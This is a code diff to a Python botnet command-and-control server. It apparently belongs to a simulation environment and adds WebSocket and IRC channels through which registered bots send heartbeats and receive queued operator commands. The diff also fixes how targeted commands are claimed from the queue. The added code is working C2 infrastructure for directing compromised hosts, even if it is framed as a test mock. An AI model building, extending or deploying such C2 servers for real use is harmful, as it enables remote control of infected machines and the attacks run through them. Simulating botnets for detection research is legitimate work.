@@ -25,6 +25,7 @@ import re
 import signal
 import socket
 import sqlite3
+import struct
 import sys
 import threading
 import time
@@ -85,7 +86,11 @@ def next_command(queue_dir, channel, tag=None):
             os.unlink(claimed)
             continue
         tgt = data.get("target") or ""
-        if tgt and tag and tgt != tag:
+        # A request with no identity (tag=None) must only claim UNTARGETED
+        # commands — otherwise the IRC loop's idle poll would claim a
+        # targeted file, find it "not for me", and drop it (consumed file,
+        # command lost, heartbeat branch never sees it).
+        if tgt and tgt != (tag or ""):
             # not for this bot — put it back so another bot can claim it
             try:
                 os.rename(claimed, src)
@@ -418,6 +423,298 @@ def serve_http(c2, port):
             break
 
 
+# ─────────────────────────── WebSocket C2 (RFC 6455) ───────────────────────────
+# Framing ported from the sim mock (tests/sim/c2/c2_ws.py); the bot's
+# ws_connect handshake is verified against Sec-WebSocket-Accept.
+
+WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
+
+
+def _ws_accept(key):
+    import base64
+    import hashlib
+    return base64.b64encode(hashlib.sha1((key + WS_GUID).encode()).digest()).decode()
+
+
+def ws_handshake(conn):
+    data = b""
+    try:
+        while b"\r\n\r\n" not in data:
+            chunk = conn.recv(4096)
+            if not chunk:
+                return False
+            data += chunk
+        head = data.split(b"\r\n\r\n", 1)[0].decode("utf-8", errors="replace")
+        lines = head.split("\r\n")
+        if not lines or "GET" not in lines[0]:
+            return False
+        key = None
+        for line in lines[1:]:
+            if line.lower().startswith("sec-websocket-key:"):
+                key = line.split(":", 1)[1].strip()
+        if not key:
+            return False
+        accept = _ws_accept(key)
+        conn.sendall((
+            "HTTP/1.1 101 Switching Protocols\r\n"
+            "Upgrade: websocket\r\n"
+            "Connection: Upgrade\r\n"
+            f"Sec-WebSocket-Accept: {accept}\r\n"
+            "\r\n").encode())
+        return True
+    except (socket.timeout, ConnectionError, OSError):
+        return False
+
+
+def ws_recv_exact(conn, n):
+    buf = b""
+    while len(buf) < n:
+        chunk = conn.recv(n - len(buf))
+        if not chunk:
+            raise ConnectionError("EOF")
+        buf += chunk
+    return buf
+
+
+def ws_read_frame(conn):
+    hdr = ws_recv_exact(conn, 2)
+    opcode = hdr[0] & 0x0F
+    masked = (hdr[1] >> 7) & 1
+    plen = hdr[1] & 0x7F
+    if plen == 126:
+        plen = int.from_bytes(ws_recv_exact(conn, 2), "big")
+    elif plen == 127:
+        plen = int.from_bytes(ws_recv_exact(conn, 8), "big")
+    mask = ws_recv_exact(conn, 4) if masked else b""
+    payload = ws_recv_exact(conn, plen)
+    if mask:
+        payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
+    return opcode, payload
+
+
+def ws_send_text(conn, text):
+    payload = text.encode("utf-8")
+    ln = len(payload)
+    if ln < 126:
+        hdr = bytes([0x81, ln])
+    elif ln < 65536:
+        hdr = bytes([0x81, 126]) + struct.pack(">H", ln)
+    else:
+        hdr = bytes([0x81, 127]) + struct.pack(">Q", ln)
+    conn.sendall(hdr + payload)
+
+
+def handle_ws(conn, addr, c2):
+    ip = addr[0]
+    try:
+        if not ws_handshake(conn):
+            return
+        log(f"WS CONNECT {ip}")
+        while True:
+            opcode, payload = ws_read_frame(conn)
+            if opcode == 0x8:  # close
+                log(f"WS CLOSE {ip}")
+                return
+            if opcode in (0x9, 0xA):  # ping/pong
+                continue
+            if opcode != 0x1:
+                continue
+            text = payload.decode("utf-8", errors="replace")
+            try:
+                j = json.loads(text)
+            except json.JSONDecodeError:
+                j = {}
+            log(f"WS FRAME {ip}: {text[:200]}")
+            if j.get("cmd") == "status":
+                if j.get("secret") != c2.secret:
+                    c2.state.add_event("auth_fail",
+                                       f"bad ws secret from {ip} host={j.get('hostname','')}")
+                    log(f"AUTH-FAIL {ip} host={j.get('hostname','')}")
+                    ws_send_text(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                    continue
+                c2.state.upsert_bot(j, ip, "ws")
+                q = next_command(c2.queue_dir, "ws", tag=j.get("tag"))
+                if q is not None:
+                    c2.state.mark_served(q.get("_id", 0), j.get("tag", ""))
+                    log(f"SERVE ws -> {j.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
+                    ws_send_text(conn, json.dumps({"cmd": q.get("cmd", "status"),
+                                                   "args": q.get("args", ""),
+                                                   "secret": c2.secret}))
+                    continue
+            ws_send_text(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+    except (socket.timeout, ConnectionError, OSError):
+        pass
+    finally:
+        try:
+            conn.close()
+        except OSError:
+            pass
+
+
+def serve_ws(c2, port):
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", port))
+    srv.listen(32)
+    log(f"LISTEN WS C2 on 0.0.0.0:{port}")
+    while True:
+        try:
+            conn, addr = srv.accept()
+            threading.Thread(target=handle_ws, args=(conn, addr, c2),
+                             daemon=True).start()
+        except KeyboardInterrupt:
+            break
+
+
+# ─────────────────────────── IRC C2 (legacy channel) ───────────────────────────
+# Flow ported from the sim mock (tests/sim/c2/c2_irc.py): welcome burst on
+# NICK (001/250/376), 366 on JOIN, then a queue-serving read loop.
+
+def irc_send(conn, line):
+    try:
+        conn.sendall((line + "\r\n").encode())
+    except OSError:
+        pass
+
+
+def handle_irc(conn, addr, c2, nick, channel):
+    ip = addr[0]
+    conn.settimeout(30)
+    buf = ""
+    bot_nick = "bot"
+    chan = channel
+    try:
+        # read until the first CRLF (NICK/USER burst)
+        for _ in range(10):
+            try:
+                data = conn.recv(1024).decode(errors="replace")
+                buf += data
+                if "\r\n" in data:
+                    break
+            except socket.timeout:
+                break
+        for line in buf.split("\r\n"):
+            line = line.strip()
+            if line.startswith("NICK"):
+                parts = line.split()
+                bot_nick = parts[1] if len(parts) > 1 else "bot"
+                irc_send(conn, f":{nick} 001 {bot_nick} :{nick}!{nick}@127.0.0.1")
+                irc_send(conn, f":{nick} 250 {bot_nick} :Connection counts")
+                irc_send(conn, f":{nick} 376 {bot_nick} :End of /MOTD")
+                log(f"IRC CONNECT {ip} nick={bot_nick}")
+                break
+        # JOIN may already be in buf (NICK+USER+JOIN coalesce)
+        joined = False
+        for line in buf.split("\r\n"):
+            line = line.strip()
+            if line.startswith("JOIN"):
+                parts = line.split()
+                chan = parts[1] if len(parts) > 1 else channel
+                irc_send(conn, f":{nick} 366 {bot_nick} {chan} :End of /NAMES list")
+                log(f"IRC JOIN {ip} channel={chan}")
+                joined = True
+                break
+        if not joined:
+            for _ in range(5):
+                try:
+                    data = conn.recv(1024).decode(errors="replace")
+                    buf += data
+                    if "JOIN" in buf:
+                        for line in buf.split("\r\n"):
+                            line = line.strip()
+                            if line.startswith("JOIN"):
+                                parts = line.split()
+                                chan = parts[1] if len(parts) > 1 else channel
+                                irc_send(conn, f":{nick} 366 {bot_nick} {chan} :End of /NAMES list")
+                                log(f"IRC JOIN {ip} channel={chan}")
+                                joined = True
+                                break
+                        break
+                except socket.timeout:
+                    break
+
+        # queue-driven serve loop
+        deadline = time.time() + 86400
+        while time.time() < deadline:
+            try:
+                probe = conn.recv(1, socket.MSG_PEEK)
+                if probe == b"":
+                    log(f"IRC CLOSED {ip} — stopping queue service")
+                    break
+            except (socket.timeout, ConnectionError, OSError):
+                log(f"IRC CLOSED {ip} — stopping queue service")
+                break
+            # serve a queued command as PRIVMSG from the authorized nick
+            q = next_command(c2.queue_dir, "irc")
+            if q is not None:
+                tgt = q.get("target") or ""
+                if not tgt:
+                    c2.state.mark_served(q.get("_id", 0), bot_nick)
+                    text = f"{q.get('cmd')} {q.get('args','')}".strip()
+                    irc_send(conn, f":{nick}!{nick}@127.0.0.1 PRIVMSG {chan} :{text}")
+                    log(f"SERVE irc -> {bot_nick} cmd={q.get('cmd')} args={q.get('args','')}")
+            try:
+                data = conn.recv(4096).decode(errors="replace")
+                if data:
+                    log(f"IRC RECV {ip}: {data[:300]}")
+                    for line in data.split("\r\n"):
+                        line = line.strip()
+                        if line.startswith("PING"):
+                            irc_send(conn, "PONG " + line[5:])
+                        elif "PRIVMSG" in line:
+                            # bot sends `PRIVMSG #chan :{json}` with NO
+                            # :nick!user@ prefix — split on " :" (the IRC
+                            # message delimiter) and take everything after.
+                            msg = line.split(" :", 1)[1] if " :" in line else ""
+                            try:
+                                hb = json.loads(msg)
+                            except (IndexError, json.JSONDecodeError):
+                                hb = {}
+                            if hb.get("cmd") == "status":
+                                if hb.get("secret") != c2.secret:
+                                    c2.state.add_event("auth_fail",
+                                                       f"bad irc secret from {ip}")
+                                    log(f"AUTH-FAIL {ip}")
+                                    continue
+                                c2.state.upsert_bot(hb, ip, "irc")
+                                # targeted command for this bot tag
+                                q = next_command(c2.queue_dir, "irc", tag=hb.get("tag"))
+                                if q is not None:
+                                    c2.state.mark_served(q.get("_id", 0), hb.get("tag", ""))
+                                    text = f"{q.get('cmd')} {q.get('args','')}".strip()
+                                    irc_send(conn, f":{nick}!{nick}@127.0.0.1 PRIVMSG {chan} :{text}")
+                                    log(f"SERVE irc -> {hb.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
+            except socket.timeout:
+                continue
+            except (ConnectionError, OSError):
+                log(f"IRC CLOSED {ip} — stopping queue service")
+                break
+            time.sleep(0.2)
+    except (socket.timeout, ConnectionError, OSError):
+        pass
+    finally:
+        try:
+            conn.close()
+        except OSError:
+            pass
+
+
+def serve_irc(c2, port, nick, channel):
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", port))
+    srv.listen(16)
+    log(f"LISTEN IRC C2 on 0.0.0.0:{port} nick={nick} channel={channel}")
+    while True:
+        try:
+            conn, addr = srv.accept()
+            threading.Thread(target=handle_irc,
+                             args=(conn, addr, c2, nick, channel),
+                             daemon=True).start()
+        except KeyboardInterrupt:
+            break
+
+
 # ─────────────────────────── operator console ───────────────────────────
 
 class ConsoleHandler(BaseHTTPRequestHandler):
@@ -601,6 +898,10 @@ def main():
     ap.add_argument("--http-port", type=int, default=int(os.environ.get("SIM_HTTP_PORT", DEFAULT_HTTP)))
     ap.add_argument("--payload-port", type=int, default=int(os.environ.get("SIM_PAYLOAD_PORT", DEFAULT_PAYLOAD)))
     ap.add_argument("--console-port", type=int, default=int(os.environ.get("SIM_CONSOLE_PORT", DEFAULT_CONSOLE)))
+    ap.add_argument("--ws-port", type=int, default=int(os.environ.get("SIM_WS_PORT", DEFAULT_WS)))
+    ap.add_argument("--irc-port", type=int, default=int(os.environ.get("SIM_IRC_PORT", DEFAULT_IRC)))
+    ap.add_argument("--irc-nick", default=os.environ.get("SIM_IRC_NICK", "mockirc"))
+    ap.add_argument("--irc-channel", default=os.environ.get("SIM_IRC_CHANNEL", "#notnet"))
     args = ap.parse_args()
 
     c2 = C2(args.secret, args.http_path, args.queue_dir, args.payload_dir, args.db)
@@ -609,6 +910,10 @@ def main():
         threading.Thread(target=serve_http, args=(c2, args.http_port), daemon=True),
         threading.Thread(target=serve_http, args=(c2, args.payload_port), daemon=True),
         threading.Thread(target=serve_console, args=(c2, args.console_port), daemon=True),
+        threading.Thread(target=serve_ws, args=(c2, args.ws_port), daemon=True),
+        threading.Thread(target=serve_irc,
+                         args=(c2, args.irc_port, args.irc_nick, args.irc_channel),
+                         daemon=True),
     ]
     for t in threads:
         t.start()
